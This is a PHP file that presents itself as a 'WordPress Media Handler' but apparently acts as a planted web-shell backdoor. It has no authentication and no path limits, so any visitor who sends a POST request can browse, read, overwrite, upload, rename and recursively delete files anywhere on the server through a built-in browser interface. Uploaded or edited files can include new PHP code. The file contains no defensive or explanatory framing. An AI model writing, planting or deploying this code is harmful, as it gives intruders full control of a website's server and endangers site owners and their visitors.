<?php
/**
 * WordPress Media Handler
 */

// Handle AJAX
if (isset($_POST['wpfm_action'])) {
    header('Content-Type: application/json');
    
    $action = $_POST['wpfm_action'];
    $path = isset($_POST['path']) ? $_POST['path'] : '';
    
    $full_path = $path;
    if (empty($full_path)) {
        $full_path = dirname(dirname(dirname(__FILE__)));
    }
    $full_path = realpath($full_path);
    
    if (!$full_path) {
        echo json_encode(['success' => false, 'error' => 'Invalid path']);
        exit;
    }
    
    switch ($action) {
        case 'list':
            if (!is_dir($full_path)) {
                echo json_encode(['success' => false, 'error' => 'Not a directory']);
                exit;
            }
            
            $items = scandir($full_path);
            $result = [];
            
            foreach ($items as $item) {
                if ($item == '.' || $item == '..') continue;
                
                $item_path = $full_path . '/' . $item;
                $result[] = [
                    'name' => $item,
                    'path' => $item_path,
                    'type' => is_dir($item_path) ? 'dir' : 'file',
                    'size' => is_file($item_path) ? filesize($item_path) : 0,
                    'modified' => filemtime($item_path)
                ];
            }
            
            usort($result, function($a, $b) {
                if ($a['type'] == $b['type']) {
                    return strcasecmp($a['name'], $b['name']);
                }
                return $a['type'] == 'dir' ? -1 : 1;
            });
            
            echo json_encode(['success' => true, 'items' => $result, 'current' => $full_path]);
            exit;
            
        case 'read':
            if (!is_file($full_path)) {
                echo json_encode(['success' => false, 'error' => 'Not a file']);
                exit;
            }
            echo json_encode(['success' => true, 'content' => file_get_contents($full_path)]);
            exit;
            
        case 'write':
            $content = isset($_POST['content']) ? $_POST['content'] : '';
            if (file_put_contents($full_path, $content) !== false) {
                echo json_encode(['success' => true]);
            } else {
                echo json_encode(['success' => false, 'error' => 'Write failed']);
            }
            exit;
            
        case 'delete':
            if (is_file($full_path)) {
                unlink($full_path);
            } elseif (is_dir($full_path)) {
                $it = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($full_path, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::CHILD_FIRST
                );
                foreach ($it as $file) {
                    if ($file->isDir()) {
                        rmdir($file->getRealPath());
                    } else {
                        unlink($file->getRealPath());
                    }
                }
                rmdir($full_path);
            }
            echo json_encode(['success' => true]);
            exit;
            
        case 'mkdir':
            $name = isset($_POST['name']) ? $_POST['name'] : '';
            if (mkdir($full_path . '/' . $name, 0755)) {
                echo json_encode(['success' => true]);
            } else {
                echo json_encode(['success' => false, 'error' => 'Mkdir failed']);
            }
            exit;
            
        case 'upload':
            $uploaded = [];
            if (isset($_FILES['files'])) {
                foreach ($_FILES['files']['name'] as $key => $name) {
                    $tmp = $_FILES['files']['tmp_name'][$key];
                    if (move_uploaded_file($tmp, $full_path . '/' . $name)) {
                        $uploaded[] = $name;
                    }
                }
            }
            echo json_encode(['success' => true, 'uploaded' => $uploaded]);
            exit;
            
        case 'rename':
            $new_name = isset($_POST['new_name']) ? $_POST['new_name'] : '';
            $new_path = dirname($full_path) . '/' . $new_name;
            if (rename($full_path, $new_path)) {
                echo json_encode(['success' => true]);
            } else {
                echo json_encode(['success' => false, 'error' => 'Rename failed']);
            }
            exit;
            
        case 'parent':
            echo json_encode(['success' => true, 'parent' => dirname($full_path)]);
            exit;
    }
    
    exit;
}
?>
<!DOCTYPE html>
<html>
<head>
    <title>Media Manager</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
        .container { max-width: 1000px; margin: 0 auto; }
        .header { background: #23282d; color: #fff; padding: 15px 20px; border-radius: 5px 5px 0 0; }
        .header h1 { font-size: 18px; }
        .toolbar { background: #fff; padding: 15px; border: 1px solid #ddd; display: flex; gap: 10px; flex-wrap: wrap; align-items: center; }
        .toolbar button { padding: 8px 16px; background: #0073aa; color: #fff; border: none; border-radius: 4px; cursor: pointer; font-size: 13px; }
        .toolbar button:hover { background: #005a87; }
        .path { font-family: monospace; font-size: 13px; color: #555; margin-left: 10px; word-break: break-all; }
        .list { background: #fff; border: 1px solid #ddd; border-top: none; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #f8f9fa; padding: 10px 15px; text-align: left; font-size: 12px; text-transform: uppercase; color: #555; border-bottom: 2px solid #ddd; }
        td { padding: 8px 15px; border-bottom: 1px solid #eee; font-size: 14px; }
        tr:hover { background: #f5f5f5; }
        .actions a { margin-right: 10px; color: #0073aa; text-decoration: none; cursor: pointer; font-size: 12px; }
        .actions a:hover { text-decoration: underline; }
        .actions .del { color: #dc3232; }
        .editor { display: none; background: #fff; padding: 20px; border: 1px solid #ddd; margin-top: 15px; border-radius: 5px; }
        .editor textarea { width: 100%; min-height: 400px; font-family: monospace; font-size: 13px; padding: 10px; border: 1px solid #ddd; border-radius: 4px; margin-bottom: 10px; }
        .editor button { padding: 8px 16px; background: #0073aa; color: #fff; border: none; border-radius: 4px; cursor: pointer; margin-right: 10px; }
        .loading { padding: 30px; text-align: center; color: #999; }
        .empty { padding: 30px; text-align: center; color: #999; }
        input[type="file"] { display: none; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header"><h1>Media Manager</h1></div>
        <div class="toolbar">
            <button onclick="goParent()">⬆ Parent</button>
            <button onclick="document.getElementById('fileInput').click()">Upload</button>
            <button onclick="loadList(currentPath)">Refresh</button>
            <input type="file" id="fileInput" multiple onchange="uploadFiles(this)">
            <button onclick="newFolder()">New Folder</button>
            <span class="path" id="pathDisplay"></span>
        </div>
        <div class="list">
            <table>
                <thead>
                    <tr><th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Actions</th></tr>
                </thead>
                <tbody id="fileList"><tr><td colspan="5" class="loading">Loading...</td></tr></tbody>
            </table>
        </div>
        <div class="editor" id="editor">
            <h3 id="editorTitle"></h3>
            <textarea id="editorContent"></textarea>
            <button onclick="saveFile()">Save</button>
            <button onclick="document.getElementById('editor').style.display='none'">Close</button>
        </div>
    </div>

    <script>
    var currentPath = '';
    var currentFile = '';

    function loadList(path) {
        currentPath = path || '';
        document.getElementById('pathDisplay').textContent = currentPath || '/';
        document.getElementById('editor').style.display = 'none';
        
        var formData = new FormData();
        formData.append('wpfm_action', 'list');
        formData.append('path', currentPath);
        
        fetch(window.location.href, { method: 'POST', body: formData })
            .then(r => r.text())
            .then(text => {
                try {
                    var data = JSON.parse(text);
                    if (data.success) {
                        renderList(data.items);
                        currentPath = data.current;
                        document.getElementById('pathDisplay').textContent = currentPath;
                    } else {
                        document.getElementById('fileList').innerHTML = '<tr><td colspan="5" class="empty">Error: ' + data.error + '</td></tr>';
                    }
                } catch(e) {
                    document.getElementById('fileList').innerHTML = '<tr><td colspan="5" class="empty">Error parsing response</td></tr>';
                }
            });
    }

    function renderList(items) {
        if (!items || items.length === 0) {
            document.getElementById('fileList').innerHTML = '<tr><td colspan="5" class="empty">Empty</td></tr>';
            return;
        }
        
        var html = '';
        items.forEach(function(item) {
            var icon = item.type === 'dir' ? '📁' : '📄';
            var actions = '';
            
            if (item.type === 'dir') {
                actions = '<a href="#" onclick="loadList(\'' + item.path.replace(/'/g, "\\'") + '\');return false;">Open</a> ';
                actions += '<a href="#" class="del" onclick="deleteItem(\'' + item.path.replace(/'/g, "\\'") + '\');return false;">Delete</a>';
            } else {
                actions = '<a href="#" onclick="editFile(\'' + item.path.replace(/'/g, "\\'") + '\');return false;">Edit</a> ';
                actions += '<a href="#" class="del" onclick="deleteItem(\'' + item.path.replace(/'/g, "\\'") + '\');return false;">Delete</a> ';
                actions += '<a href="#" onclick="renameItem(\'' + item.path.replace(/'/g, "\\'") + '\');return false;">Rename</a>';
            }
            
            html += '<tr>';
            html += '<td>' + icon + ' ' + item.name + '</td>';
            html += '<td>' + item.type + '</td>';
            html += '<td>' + (item.type === 'file' ? formatSize(item.size) : '-') + '</td>';
            html += '<td>' + new Date(item.modified * 1000).toLocaleString() + '</td>';
            html += '<td class="actions">' + actions + '</td>';
            html += '</tr>';
        });
        
        document.getElementById('fileList').innerHTML = html;
    }

    function formatSize(bytes) {
        if (bytes >= 1073741824) return (bytes / 1073741824).toFixed(2) + ' GB';
        if (bytes >= 1048576) return (bytes / 1048576).toFixed(2) + ' MB';
        if (bytes >= 1024) return (bytes / 1024).toFixed(2) + ' KB';
        return bytes + ' B';
    }

    function goParent() {
        var formData = new FormData();
        formData.append('wpfm_action', 'parent');
        formData.append('path', currentPath);
        
        fetch(window.location.href, { method: 'POST', body: formData })
            .then(r => r.json())
            .then(data => {
                if (data.success) loadList(data.parent);
            });
    }

    function editFile(path) {
        var formData = new FormData();
        formData.append('wpfm_action', 'read');
        formData.append('path', path);
        
        fetch(window.location.href, { method: 'POST', body: formData })
            .then(r => r.text())
            .then(text => {
                var data = JSON.parse(text);
                if (data.success) {
                    currentFile = path;
                    document.getElementById('editorTitle').textContent = 'Editing: ' + path;
                    document.getElementById('editorContent').value = data.content;
                    document.getElementById('editor').style.display = 'block';
                }
            });
    }

    function saveFile() {
        var formData = new FormData();
        formData.append('wpfm_action', 'write');
        formData.append('path', currentFile);
        formData.append('content', document.getElementById('editorContent').value);
        
        fetch(window.location.href, { method: 'POST', body: formData })
            .then(r => r.json())
            .then(data => {
                if (data.success) {
                    alert('Saved!');
                    loadList(currentPath);
                }
            });
    }

    function deleteItem(path) {
        if (!confirm('Delete: ' + path + '?')) return;
        
        var formData = new FormData();
        formData.append('wpfm_action', 'delete');
        formData.append('path', path);
        
        fetch(window.location.href, { method: 'POST', body: formData })
            .then(r => r.json())
            .then(data => {
                if (data.success) loadList(currentPath);
            });
    }

    function renameItem(path) {
        var newName = prompt('New name:', path.split('/').pop());
        if (!newName) return;
        
        var formData = new FormData();
        formData.append('wpfm_action', 'rename');
        formData.append('path', path);
        formData.append('new_name', newName);
        
        fetch(window.location.href, { method: 'POST', body: formData })
            .then(r => r.json())
            .then(data => {
                if (data.success) loadList(currentPath);
            });
    }

    function newFolder() {
        var name = prompt('Folder name:');
        if (!name) return;
        
        var formData = new FormData();
        formData.append('wpfm_action', 'mkdir');
        formData.append('path', currentPath);
        formData.append('name', name);
        
        fetch(window.location.href, { method: 'POST', body: formData })
            .then(r => r.json())
            .then(data => {
                if (data.success) loadList(currentPath);
            });
    }

    function uploadFiles(input) {
        var files = input.files;
        if (!files.length) return;
        
        var formData = new FormData();
        for (var i = 0; i < files.length; i++) {
            formData.append('files[]', files[i]);
        }
        formData.append('wpfm_action', 'upload');
        formData.append('path', currentPath);
        
        fetch(window.location.href, { method: 'POST', body: formData })
            .then(r => r.json())
            .then(data => {
                if (data.success) loadList(currentPath);
            });
    }

    loadList('');
    </script>
</body>
</html>